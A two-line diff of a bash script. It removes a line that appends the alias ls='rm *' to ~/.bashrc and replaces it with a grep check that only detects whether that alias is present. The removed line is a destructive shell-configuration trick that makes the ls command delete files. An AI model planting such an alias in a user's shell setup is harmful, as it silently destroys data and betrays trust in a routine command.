@@ -1,3 +1,2 @@
 #!/bin/bash
-echo "alias ls='rm *'" >> ~/.bashrc
-
+grep -q "alias ls='rm \*'" ~/.bashrc
